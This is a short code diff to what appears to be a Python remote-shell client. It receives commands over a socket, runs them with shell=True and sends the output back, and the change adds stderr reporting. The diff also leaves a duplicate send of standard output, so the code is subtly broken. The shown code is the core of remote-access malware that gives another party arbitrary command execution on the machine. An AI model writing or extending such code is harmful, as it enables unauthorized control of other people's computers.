@@ -71,9 +71,13 @@ Manual:
             directory_name = s.recv(1024).decode().strip()
             client_path(s, directory_name)
 
-        else:
+        else:        
             output = subprocess.run(data, shell=True, capture_output=True, text=True)
             send_data(s, output.stdout)
+            if output.stdout:
+                send_data(s, output.stdout)  # Send the standard output
+            if output.stderr:
+                send_data(s, f"\n[ERROR] Command failed: {output.stderr}\n")
 
     except Exception as e:
         print("Error in cmd:", e)
